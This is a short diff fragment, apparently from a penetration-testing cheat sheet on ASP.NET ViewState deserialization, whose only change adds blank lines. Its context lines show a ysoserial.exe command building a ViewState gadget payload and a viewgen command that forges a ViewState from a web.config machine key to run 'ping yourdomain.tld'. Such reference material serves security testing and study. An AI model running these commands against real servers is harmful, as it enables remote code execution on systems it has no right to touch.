@@ -18,3 +18,5 @@ $ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "C:\Users\z
 
 $ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
 ```
+
+
